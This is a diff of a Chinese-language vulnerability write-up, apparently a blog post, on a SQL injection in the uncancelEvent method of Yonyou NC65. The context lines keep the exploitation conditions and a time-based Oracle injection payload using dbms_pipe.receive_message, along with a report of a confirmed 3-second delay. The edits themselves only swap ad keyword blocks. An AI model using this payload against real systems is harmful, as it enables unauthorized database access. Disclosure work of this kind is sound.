@@ -22,14 +22,6 @@ NC65
 
 `SchedulerEventsAction` 此前出现过 `listUserSharingEvents` sql注入漏洞，详情可以看这篇[用友NC listUserSharingEvents SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html) ，而此次出现漏洞的方法变成了 `uncancelEvent`
 
-深入探索
-
-网络安全书籍
-
-Windows安全工具
-
-计算机安全
-
 ```
 public void uncancelEvent() throws BusinessException {
         this.cancelEventOperate("1");
@@ -66,11 +58,11 @@ public void uncancelEvent() throws BusinessException {
 
 深入探索
 
-在线工具箱
+网络设备
 
-安全编码指南
+商务软件和生产力软件
 
-数据备份服务
+客户关系管理
 
 它与前面的文章 [用友NC changeEvent SQL注入漏洞](https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-changeEvent-sqli.html) 处理逻辑是一样的，也是因为`pid_event` 被直接拼接到sql语句中进行执行从而造成[SQL注入漏洞](https://mrxn.net/tag/SQL注入)。
 
@@ -78,7 +70,7 @@ public void uncancelEvent() throws BusinessException {
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用需要条件
 
-漏洞扫描服务
+企业资源规划
 
 1. 请求中需包含 `event_id` 参数（含 `#` 字符）。
 2. 其他参数（如 `startDate`、`event_ts`、`startDate_old`）需满足类型要求（可伪造合法值如 2025-05-07 12:12:12）。
@@ -95,4 +87,4 @@ event_id=-1'AND 1=dbms_pipe.receive_message('RDS',3)--+#+&startDate=2025-05-07 1
 
 成功延时 3 秒
 
-企业资源规划
+数据管理
